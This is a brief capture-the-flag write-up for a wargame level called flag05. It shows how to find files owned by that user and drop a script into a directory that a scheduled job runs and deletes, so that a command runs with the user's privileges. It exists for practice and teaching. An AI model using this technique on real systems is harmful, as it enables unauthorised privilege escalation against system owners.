$> find / -user flag05 2>/dev/null

give us files own by the user flag05
	/usr/sbin/openarenaserver
	/rofs/usr/sbin/openarenaserver

those files are shell script who execute and remove
and shell script in /opt/openarenaserver/ as flag05 user

so we need to craft a shell script that send the getflag command to a file

$> echo "getflag > /tmp/flag" > /opt/openarenaserver/script.sh
$> chmod +x /opt/openarenaserver/script.sh

and wait til the task is done then read the flag file

$> while [ -e /opt/openarenaserver/script.sh ]; do sleep 1; done; cat /tmp/flag
